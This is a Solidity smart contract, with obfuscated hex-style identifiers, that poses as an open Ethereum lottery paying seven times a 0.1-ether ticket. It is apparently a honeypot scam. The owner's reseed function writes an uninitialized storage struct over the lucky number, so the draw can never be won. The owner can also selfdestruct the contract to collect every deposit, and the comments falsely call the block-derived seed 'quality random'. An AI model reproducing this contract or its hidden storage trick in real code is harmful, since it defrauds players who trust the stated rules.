contract OpenAddressLottery{
    struct SeedComponents{
        uint _0x8ed18f;
        uint _0x32f6e2;
        uint _0xcdaeef;
        uint _0x116f5e;
    }

    address _0xd74276; //address of the owner
    uint private _0xc95ebc; //seed used to calculate number of an address
    uint private _0xe1c395; //last reseed - used to automatically reseed the contract every 1000 blocks
    uint LuckyNumber = 7; //if the number of an address equals 7, it wins

    mapping (address => bool) _0x7b0cd9; //keeping track of addresses that have already won

    function OpenAddressLottery() {
        _0xd74276 = msg.sender;
        _0xf182c8(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp)); //generate a quality random seed
    }

    function _0x30744a() payable {
        if(msg.value<0.1 ether)
            return; //verify ticket price

        // make sure he hasn't won already
        require(_0x7b0cd9[msg.sender] == false);

        if(_0xaf0869(msg.sender) == LuckyNumber){ //check if it equals 7
            _0x7b0cd9[msg.sender] = true; // every address can only win once

            uint _0x67057f=msg.value*7; //win = 7 times the ticket price

            if(_0x67057f>this.balance) //if the balance isnt sufficient...
                _0x67057f=this.balance; //...send everything we've got
            msg.sender.transfer(_0x67057f);
        }

        if(block.number-_0xe1c395>1000) //reseed if needed
            _0xf182c8(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp)); //generate a quality random seed
    }

    function _0xaf0869(address _0xb8d5f0) constant returns(uint n){
        // calculate the number of current address - 1 in 8 chance
        n = uint(_0x1a7936(uint(_0xb8d5f0), _0xc95ebc)[0]) % 8;
    }

    function _0xf182c8(SeedComponents _0x6e7355) internal {
        _0xc95ebc = uint256(_0x1a7936(
            _0x6e7355._0x8ed18f,
            _0x6e7355._0x32f6e2,
            _0x6e7355._0xcdaeef,
            _0x6e7355._0x116f5e
        )); //hash the incoming parameters and use the hash to (re)initialize the seed
        _0xe1c395 = block.number;
    }

    function _0x2564a1() {
        require(msg.sender==_0xd74276);

        selfdestruct(msg.sender);
    }

    function _0x9bdb83() { //reseed initiated by the owner - for testing purposes
        require(msg.sender==_0xd74276);

        SeedComponents s;
        s._0x8ed18f = uint(msg.sender);
        s._0x32f6e2 = uint256(block.blockhash(block.number - 1));
        s._0xcdaeef = block.difficulty*(uint)(block.coinbase);
        s._0x116f5e = tx.gasprice * 7;

        _0xf182c8(s); //reseed
    }

    function () payable { //if someone sends money without any function call, just assume he wanted to participate
        if(msg.value>=0.1 ether && msg.sender!=_0xd74276) //owner can't participate, he can only fund the jackpot
            _0x30744a();
    }

}
